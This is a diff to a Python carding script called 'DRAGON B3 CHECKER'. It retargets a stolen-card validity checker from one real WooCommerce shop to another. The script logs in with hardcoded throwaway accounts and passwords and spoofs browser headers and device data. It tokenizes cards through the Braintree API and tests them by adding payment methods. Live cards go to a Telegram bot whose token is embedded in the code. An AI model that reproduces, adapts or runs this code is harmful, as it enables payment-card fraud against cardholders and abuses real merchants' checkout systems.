@@ -153,18 +153,18 @@ for y in y:
     bin_code = c[:6]
     if "20" in yy:
         yy = yy.split("20")[1]
-    acc = ['dragonfight001@gmail.com', 'dragonfight003@gmail.com', 'furego846@bangban.uk', 'yetagofor68@usako.net', 'rowaskrib@nekosan.uk', 'okfur101@cream.pink', 'kidpalass@fanclub.pm', 'orletfad@macr2.com', 'cupsad637@fuwari.be', 'oxraw246@honeys.be', 'farcodrow@boxfi.uk']
+    acc = ['dragonfight001@gmail.com', 'dragonfight002@gmail.com', 'dragonfight003@gmail.com', 'dragonfight004@gmail.com', 'dragonfight005@gmail.com', 'dragonfight006@gmail.com', 'bincryrid@hamham.uk', 'dipflypar@kksm.be', 'duecapas545@choco.la', 'rag481@kmail.li', 'jotdrpry@mirai.re', 'dinmapis@instmail.uk', 'maddubits@sendapp.uk', 'dragontech177@gmail.com', 'himhas407@send4.uk', 'nadiya001@exdonuts.com', 'zipmobsir750@exdonuts.com', 'figlaxno@exdonuts.com', 'cryournet@kksm.be', 'dewask760@send4.uk']
     email = random.choice(acc)
     print(F) 
     user = user_agent.generate_user_agent()
     r = requests.session()
     headers = {'user-agent': user}
     response = r.post(
-        'https://unclejimswormfarm.com/my-account/add-payment-method/', headers=headers)
+        'https://www.studynotesaba.com/my-account/add-payment-method/', headers=headers)
     nonce = (re.search(r'name="woocommerce-login-nonce" value="(.*?)"', response.text).group(1))
     data = {
     'username': email,
-    'password': 'Ua!8tE6nRfchScS',
+    'password': 'ZmwXn8zkU2kK!LP',
     'wpa_initiator': '',
     'alt_s': '',
     'udwsno9687': '828176',
@@ -175,7 +175,7 @@ for y in y:
 }
     
     response = r.post(
-        'https://unclejimswormfarm.com/my-account/add-payment-method/',
+        'https://www.studynotesaba.com/my-account/add-payment-method/',
         cookies=r.cookies,
         headers=headers,
         data=data,
@@ -200,14 +200,14 @@ for y in y:
     'sec-fetch-dest': 'empty',
     'sec-fetch-mode': 'cors',
     'sec-fetch-site': 'cross-site',
-    'user-agent': user,
+    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
 }
 
     json_data = {
     'clientSdkMetadata': {
         'source': 'client',
         'integration': 'custom',
-        'sessionId': '13cd5244-0b6c-4f0f-9aa6-e5c56f913d19',
+        'sessionId': '20b8ad05-caab-4870-bcbf-607a168670ac',
     },
     'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
     'variables': {
@@ -234,43 +234,36 @@ for y in y:
     tok = response.json()['data']['tokenizeCreditCard']['token']
     import requests
     headers = {
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'en-US,en;q=0.9,bn;q=0.8',
-    'cache-control': 'max-age=0',
-    'content-type': 'application/x-www-form-urlencoded',
-    'origin': 'https://unclejimswormfarm.com',
-    'priority': 'u=0, i',
-    'referer': 'https://unclejimswormfarm.com/my-account/add-payment-method/',
-    'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
-    'sec-ch-ua-arch': '"x86"',
-    'sec-ch-ua-bitness': '"64"',
-    'sec-ch-ua-full-version': '"131.0.6778.205"',
-    'sec-ch-ua-full-version-list': '"Google Chrome";v="131.0.6778.205", "Chromium";v="131.0.6778.205", "Not_A Brand";v="24.0.0.0"',
-    'sec-ch-ua-mobile': '?0',
-    'sec-ch-ua-model': '""',
-    'sec-ch-ua-platform': '"Windows"',
-    'sec-ch-ua-platform-version': '"10.0.0"',
-    'sec-fetch-dest': 'document',
-    'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'same-origin',
-    'sec-fetch-user': '?1',
-    'upgrade-insecure-requests': '1',
-    'user-agent': user}
+        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+        'accept-language': 'en-US,en;q=0.9,bn;q=0.8',
+        'cache-control': 'max-age=0',
+        'content-type': 'application/x-www-form-urlencoded',
+        'origin': 'https://www.studynotesaba.com',
+        'priority': 'u=0, i',
+        'referer': 'https://www.studynotesaba.com/my-account/add-payment-method/',
+        'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Windows"',
+        'sec-fetch-dest': 'document',
+        'sec-fetch-mode': 'navigate',
+        'sec-fetch-site': 'same-origin',
+        'sec-fetch-user': '?1',
+        'upgrade-insecure-requests': '1',
+        'user-agent': user}
     
     data = {
     'payment_method': 'braintree_cc',
     'braintree_cc_nonce_key': tok,
-    'braintree_cc_device_data': '',
+    'braintree_cc_device_data': '{"device_session_id":"37520bac157b40c0fe981caa8641bd40","fraud_merchant_id":null,"correlation_id":"20b8ad05-caab-4870-bcbf-607a1686"}',
     'braintree_cc_3ds_nonce_key': '',
-    'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/zgmjz6bk4shsk2zd/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/zgmjz6bk4shsk2zd"},"merchantId":"zgmjz6bk4shsk2zd","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"applePayWeb":{"countryCode":"US","currencyCode":"USD","merchantIdentifier":"zgmjz6bk4shsk2zd","supportedNetworks":["visa","mastercard","amex","discover"]},"kount":{"kountMerchantId":null},"challenges":["cvv"],"creditCards":{"supportedCardTypes":["American Express","Discover","JCB","MasterCard","Visa","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"androidPay":{"displayName":"Uncle Jims Worm Farm","enabled":true,"environment":"production","googleAuthorizationFingerprint":"eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MzU1NzE3MjEsImp0aSI6ImQxNWE1OTAyLWQyMDItNDQ3Ny05YTlmLTE4ZTljYWUxYTE0MSIsInN1YiI6InpnbWp6NmJrNHNoc2syemQiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InpnbWp6NmJrNHNoc2syemQiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbInRva2VuaXplX2FuZHJvaWRfcGF5IiwibWFuYWdlX3ZhdWx0Il0sInNjb3BlIjpbIkJyYWludHJlZTpWYXVsdCJdLCJvcHRpb25zIjp7fX0.Dvds3ul798HxJjwoMu2aMiP2SXFloVvTmV4MoucH6-wQhV0epGE8qi7X4IFeMhDDIuwoITVF__Ey8roS3kPkDg","paypalClientId":"ATLxCsU3hyoXL6tIuU4X5FH4zBJ7BoD_-BTfhyHrYdFqbzLhqY7GIKNOrpCIPU4WDpdzZ3XUALu6971a","supportedNetworks":["visa","mastercard","amex","discover"]},"payWithVenmo":{"merchantId":"3119910952783315598","accessToken":"access_token$production$zgmjz6bk4shsk2zd$c0462a05c55ebba64c943763ea0be348","environment":"production","enrichedCustomerDataEnabled":false},"paypalEnabled":false}',
+    'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/fsqwv5czpsr7wnqc/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/fsqwv5czpsr7wnqc"},"merchantId":"fsqwv5czpsr7wnqc","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"applePayWeb":{"countryCode":"US","currencyCode":"USD","merchantIdentifier":"fsqwv5czpsr7wnqc","supportedNetworks":["visa","mastercard","amex","discover"]},"fastlane":{"enabled":true},"kount":{"kountMerchantId":null},"challenges":["cvv"],"creditCards":{"supportedCardTypes":["Discover","JCB","MasterCard","Visa","American Express","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"androidPay":{"displayName":"Study Notes ABA LLC","enabled":true,"environment":"production","googleAuthorizationFingerprint":"eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MzU1NzcyMjEsImp0aSI6ImY0OTQ0YjZmLWFlNTUtNDgwZC1iYTI4LWE3MjhiZTUzOTI1ZCIsInN1YiI6ImZzcXd2NWN6cHNyN3ducWMiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImZzcXd2NWN6cHNyN3ducWMiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbInRva2VuaXplX2FuZHJvaWRfcGF5IiwibWFuYWdlX3ZhdWx0Il0sInNjb3BlIjpbIkJyYWludHJlZTpWYXVsdCIsIkJyYWludHJlZTpBWE8iXSwib3B0aW9ucyI6e319.zOq4TallcTlPTHtyipNT9ny8jQPDz2TDZ0-DX6sZOtQOfc9x97cP6tTIGzFt0CH3gtSPV_NKub5fWCVQzUD2Yw","paypalClientId":"AdK9MKiret3zcVK9VufGNTD9wp47RxRz4Cx_YlrHe0beIfHzkHbwy3naaP0NrI7ZJ-ZNQ7s7c1eEIsbY","supportedNetworks":["visa","mastercard","amex","discover"]},"paypalEnabled":true,"paypal":{"displayName":"Study Notes ABA LLC","clientId":"AdK9MKiret3zcVK9VufGNTD9wp47RxRz4Cx_YlrHe0beIfHzkHbwy3naaP0NrI7ZJ-ZNQ7s7c1eEIsbY","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"studynotesaballc_instant","payeeEmail":null,"currencyIsoCode":"USD"}}',
     'woocommerce-add-payment-method-nonce': nonce,
     '_wp_http_referer': '/my-account/add-payment-method/',
     'woocommerce_add_payment_method': '1',
-    'apbct_visible_fields': 'eyIwIjp7InZpc2libGVfZmllbGRzIjoiIiwidmlzaWJsZV9maWVsZHNfY291bnQiOjAsImludmlzaWJsZV9maWVsZHMiOiJicmFpbnRyZWVfY2Nfbm9uY2Vfa2V5IGJyYWludHJlZV9jY19kZXZpY2VfZGF0YSBicmFpbnRyZWVfY2NfM2RzX25vbmNlX2tleSBicmFpbnRyZWVfY2NfY29uZmlnX2RhdGEgd29vY29tbWVyY2UtYWRkLXBheW1lbnQtbWV0aG9kLW5vbmNlIF93cF9odHRwX3JlZmVyZXIgd29vY29tbWVyY2VfYWRkX3BheW1lbnRfbWV0aG9kIiwiaW52aXNpYmxlX2ZpZWxkc19jb3VudCI6N319',
 }
     
     response = r.post(
-        'https://unclejimswormfarm.com/my-account/add-payment-method/',
+        'https://www.studynotesaba.com/my-account/add-payment-method/',
         cookies=r.cookies,
         headers=headers,
         data=data,
@@ -298,7 +291,18 @@ for y in y:
         save_valid_card(ccx)
         username = get_telegram_username(user_id, bot_token)
         bin_result = bin_lookup(bin_code)
-        message = f"""✥ 𝐃𝐑𝐀𝐆𝐎𝐍 𝐁₃ 𝐂𝐇𝐄𝐂𝐊𝐄𝐑 𝐕2.1 ✥\n★━━━━━━✧★✰★✧━━━━━━★\n🔹 𝗖𝗮𝗿𝗱- {ccx}\n🔹 𝗚𝗮𝘁𝗲𝘄𝗮𝘆- Braintree Auth\n🔹 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲- ⤿ {result} ⤾\n★━━━━━━[𝐁𝐈𝐍 𝐈𝐍𝐅𝐎]━━━━━━★\n{bin_result}\n★━━━━━━✧★✰★✧━━━━━━★\n✨ 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐝 𝐁𝐲- [★ Night Stalker 🐾🐐](tg://user?id=1344144034)\n✨ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲- {username}"""
+        message = f"""
+✥ 𝐃𝐑𝐀𝐆𝐎𝐍 𝐁₃ 𝐂𝐇𝐄𝐂𝐊𝐄𝐑 𝐕2.1 ✥
+★━━━━━━✧★✰★✧━━━━━━★
+🔹 𝗖𝗮𝗿𝗱- {ccx}
+🔹 𝗚𝗮𝘁𝗲𝘄𝗮𝘆- Braintree [$0.01]
+🔹 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲- ⤿ {result} ⤾
+★━━━━━━[𝐁𝐈𝐍 𝐈𝐍𝐅𝐎]━━━━━━★
+{bin_result}
+★━━━━━━✧★✰★✧━━━━━━★
+✨ 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐝 𝐁𝐲- [★ Night Stalker 🐾🐐](tg://user?id=1344144034)
+✨ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲- {username}
+"""
         requests.post(f"https://api.telegram.org/bot7814941492:AAFdOLY604OvdbptJBh6KFgvUkGkx-h3UHg/sendMessage", data={'chat_id': user_id, 'text': message, 'parse_mode': 'Markdown'})
 else:
     print(f'[{start_num}] {ccx} >> {result}❌')
